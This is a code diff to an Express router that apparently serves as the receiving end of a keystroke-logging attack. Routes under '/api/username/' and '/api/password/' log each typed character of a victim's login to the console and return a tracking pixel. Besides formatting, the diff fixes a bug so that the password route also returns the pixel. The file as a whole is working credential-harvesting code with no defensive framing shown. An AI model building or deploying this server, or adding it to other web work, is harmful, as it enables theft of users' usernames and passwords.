@@ -12,18 +12,22 @@ const trackingPixelPath = path.join(
 );
 
 /* GET home page. */
-router.get('/', function(req, res, next) {
-  res.render('index', { title: 'Express' });
+router.get('/', function (req, res, next) {
+  res.render('index', {
+    title: 'Express'
+  });
 });
 
-router.get('/api/username/:keystroke', function(req, res, next) {
+router.get('/api/username/:keystroke', function (req, res, next) {
   console.log('username:', req.params.keystroke);
+  res.status(200);
   res.sendFile(trackingPixelPath);
 });
 
-router.get('/api/password/:keystroke', function(req, res, next) {
+router.get('/api/password/:keystroke', function (req, res, next) {
   console.log('password:', req.params.keystroke);
-  res.sendStatus(trackingPixelPath);
+  res.status(200);
+  res.sendFile(trackingPixelPath);
 });
 
 module.exports = router;
